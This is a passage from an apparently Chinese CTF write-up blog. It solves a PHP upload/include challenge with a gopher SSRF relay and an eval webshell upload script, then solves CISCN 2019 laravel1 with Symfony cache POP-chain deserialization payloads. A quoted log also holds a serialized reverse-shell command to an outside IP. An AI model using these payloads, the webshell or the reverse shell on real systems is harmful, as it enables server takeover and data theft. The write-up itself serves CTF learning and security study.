class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.cindemor.com/post/ctf-web-12.html" target="_blank" rel="noopener">https://blog.cindemor.com/post/ctf-web-12.html</a></p>
<p>gopher来ssrf发包先用shell写一个s.php文件负责gopher的接受和发送</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>($url) &#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line">$co = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">echo</span> $co;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload如下, 这里的305.php是已经爆破得到的文件名字, 实际上这个payload在包含的过程中也在写shell , 使用intruder功能在305 的位置进行爆破就可以得到文件名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">command=<span class="string">"system('cat /etc/flag_is_He4e_89587236.txt');"</span></span><br><span class="line">exp=<span class="string">'''\</span></span><br><span class="line"><span class="string">POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 173.189.217.10</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Length: %s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="gml.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@&lt;?php echo 1;@eval($_POST['gml']);?&gt;</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[1]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file[0]"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">php/.</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="hello"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">./305.php</span></span><br><span class="line"><span class="string">-----------------------------444980421912</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="gml"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------444980421912--</span></span><br><span class="line"><span class="string">'''</span>%(<span class="number">614</span><span class="number">-15</span>+len(command),command)</span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">new = tmp.replace(<span class="string">"%0A"</span>,<span class="string">"%0D%0A"</span>)</span><br><span class="line">result = <span class="string">"_"</span>+urllib.quote(new)</span><br><span class="line">result=<span class="string">"gopher://173.189.217.10:80/"</span>+result</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> requests.get(<span class="string">"http://db6b1032-7190-416f-a2a6-91c8d4c2c7a6.node3.buuoj.cn/upload/s.php?url="</span>+result).content</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019-laravel1">CISCN 2019 laravel1</h2>
<p>首页代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看样子是把参数payload的值直接反序列化了,那么关键是拥有__destruct魔法方法的类了.</p>
<p>下载源码.源码很大很大,发现了日志文件(最下面)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66810943-c86e0e00-ef62-11e9-8804-f54dbe78fa59.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:6:&quot;_token&quot;;s:40:&quot;mg8pRdzQ1mQyQuhTbJV3KnfQl9zstzASDGOSzOuE&quot;;s:9:&quot;_previous&quot;;a:1:&#123;s:3:&quot;url&quot;;s:927:&quot;http://localhost/pop_chain/laravel/public/index.php/index?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A45%3A%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F115.159.184.127%2F9998%200%3E%261%22%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00%2A%00expiry%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B%7D%7D&quot;;&#125;s:6:&quot;_flash&quot;;a:2:&#123;s:3:&quot;old&quot;;a:0:&#123;&#125;s:3:&quot;new&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>关键类是<code>TagAwareAdapter</code> ,这段sessoin直接改掉使用的话我打不出来,不过可以根据这个去找相应的pop链条.</p>
<p>TagAwareAdapter.php代码(删除了大部分没有用的代码)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">TagAwareCacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span> <span class="keyword">implements</span> <span class="title">TagAwareAdapterInterface</span>, <span class="title">TagAwareCacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> TAGS_PREFIX = <span class="string">"\0tags\0"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $deferred = [];</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setCacheItemTags;</span><br><span class="line">    <span class="keyword">private</span> $getTagsByKey;</span><br><span class="line">    <span class="keyword">private</span> $invalidateTags;</span><br><span class="line">    <span class="keyword">private</span> $tags;</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersions = [];</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersionsTtl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    __construct构造函数,对题目没有帮助,因此略过</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ok = <span class="keyword">true</span>;</span><br><span class="line">        $tagsByKey = [];</span><br><span class="line">        $invalidatedTags = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">            CacheItem::validateKey($tag);</span><br><span class="line">            $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                    $ok = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            $tagsByKey = $f($items);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $tagVersions = <span class="keyword">$this</span>-&gt;getTagVersions($tagsByKey, $invalidatedTags);</span><br><span class="line">        $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($tagsByKey <span class="keyword">as</span> $key =&gt; $tags) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($f(<span class="keyword">static</span>::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key]));</span><br><span class="line">        &#125;</span><br><span class="line">        $ok = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; $ok;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($invalidatedTags) &#123;</span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">            $ok = $f(<span class="keyword">$this</span>-&gt;tags, $invalidatedTags) &amp;&amp; $ok;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $ok;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred[$item-&gt;getKey()] = $item;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>$this-&gt;pool-&gt;saveDeferred($item)</code> 这一段是我们可以操控的.在项目中全局搜索含有saveDeferred方法或者__call方法的类.最终经过筛选得到的结果如下:</p>
<p>PhpArrrayAdapter.php(删掉很多无用的东西了):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Exception</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">PhpArrayTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PhpArrayTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进initialize方法,发现是从PhpArrayTrait.php 里面来的.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $values = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> !== \count($values) || !<span class="keyword">isset</span>($values[<span class="number">0</span>], $values[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = $values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里有文件包含,于是构造payload,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// https://www.cnblogs.com/wfzWebSecuity/p/11263051.html</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">// PhpArrrayAdapter.php 中$item的参数必须实现了CacheItemInterface接口,在头部的use项中可以找到use Symfony\Component\Cache\CacheItem;并且发现他实现了这个接口,那么就使用它,没有具体内容.</span><br><span class="line"><span class="comment">// 没有关系的不同的命名空间之间需要用花括号来隔离开来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="comment">// class ProxyAdapterTest&#123;&#125;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'tr1ple'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二种解法:</p>
<p>ProxyAdapter.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $namespace;</span><br><span class="line">    <span class="keyword">private</span> $namespaceLen;</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;doSave($item, <span class="keyword">__FUNCTION__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">(CacheItemInterface $item, $method)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $item = (<span class="keyword">array</span>) $item;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === $item[<span class="string">"\0*\0expiry"</span>] &amp;&amp; <span class="number">0</span> &lt; $item[<span class="string">"\0*\0defaultLifetime"</span>]) &#123;</span><br><span class="line">            $item[<span class="string">"\0*\0expiry"</span>] = microtime(<span class="keyword">true</span>) + $item[<span class="string">"\0*\0defaultLifetime"</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</span><br><span class="line">            $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;pool <span class="keyword">instanceof</span> AdapterInterface) &#123;</span><br><span class="line">            <span class="comment">// this is an optimization specific for AdapterInterface implementations</span></span><br><span class="line">            <span class="comment">// so we can save a round-trip to the backend by just creating a new item</span></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line">            $innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>], <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $innerItem = <span class="keyword">$this</span>-&gt;pool-&gt;getItem(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);<span class="comment">//这里就是代码执行的地方了</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;$method($innerItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     <span class="comment">// pay attention to the two namespace                                      </span></span><br><span class="line"><span class="comment">// the last namespace was included in the first namespace                  </span></span><br><span class="line"><span class="comment">// that is why we do not need to seperate them                             </span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">"id"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $deferred;</span><br><span class="line">    <span 